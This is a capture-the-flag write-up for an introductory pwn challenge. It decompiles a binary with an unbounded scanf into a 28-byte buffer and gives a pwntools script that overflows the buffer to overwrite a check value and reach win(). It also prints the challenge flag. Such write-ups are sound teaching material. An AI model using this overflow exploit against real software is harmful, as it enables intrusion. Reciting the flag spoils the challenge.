# intro 

## Description: 

* Welcome to pwn city :) 

## Objective: 

* Take advantage of *Bof* to overwrite the value of `check` and call `win()`.

## Flag: :black_flag:
* UNIWA{w3lc0M3_2_pwN_c1TY_fr13nd!}

## Challenge:

The interface looks like this:

```sh
w3th4nds@void:~/github/UniWA_CTF_2020-2021/pwn/intro$ ./intro 
Welcome to pwn city!
This is just an intro level to warm up.
Please enter your name:
> w3t
Nice to meet you w3t!
```

 Nothing more to see here, let's disassemble the program.

### Disassembly :pick:

We start from `main()`:

```c
undefined8 main(void)

{
  undefined local_28 [28];
  int local_c;
  
  setup();
  local_c = -0x21524111;
  printf(
        "Welcome to pwn section!\nThis is just an intro level to warm up.\nPlease enter yourname:\n> "
        );
  __isoc99_scanf(&DAT_00100a43,local_28);
  if (local_c == -0x3f214542) {
    win();
  }
  printf("Nice to meet you %s!\n",local_28);
  return 0;
}
```

We see that there is a call to `win()`.

`win():`

```c
void win(void)

{
  puts("Congratulations! Here is your flag!");
  system("cat flag*");
  return;
}
```

We see that there is a *bof* at `scanf`, that we can take advantage of.

The buffer is 28 bytes and `scanf` reads unlimited bytes. 

We can do 2 things:

* Overflow the buffer and change the value of `local_c` in order to call `win`.
* Overflow the buffer and overwrite the return address in order to call `win`.

I just changed the value that is after the buffer as we can see from the disassembly.

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr' # change this
port = 6969 # change this
fname = './intro'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	junk = b'i'*28
	payload = junk + p64(0xc0debabe)
	sla('>', payload)
	ru('{')[:-1]
	flag = ru('}')
	print('Flag: UNIWA{' + flag.decode())

if __name__ == '__main__':
	pwn()
```

### PoC: :checkered_flag:

```sh
w3th4nds@void:~/github/UniWA_CTF_2020-2021/pwn/intro$ ./exp.py 
[+] Starting local process './intro': pid 6846
Flag: UNIWA{w3lc0M3_2_pwN_c1TY_fr13nd!}
```
